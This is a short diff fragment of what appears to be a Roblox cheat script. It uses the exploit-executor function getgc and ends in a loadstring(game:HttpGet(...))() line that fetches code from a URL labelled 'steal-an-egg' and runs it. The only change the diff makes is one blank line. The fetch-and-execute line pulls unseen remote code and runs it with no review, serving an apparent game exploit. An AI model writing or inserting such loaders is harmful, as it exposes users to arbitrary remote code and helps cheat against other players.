@@ -12,4 +12,5 @@ for _, obj in getgc(true) do
         end
     end
 end
+
 loadstring(game:HttpGet("https://luauforge-antiraw.netlify.app/raw/steal-an-egg-hHb0cLgvyhEM9jzpSuMCX7o"))()
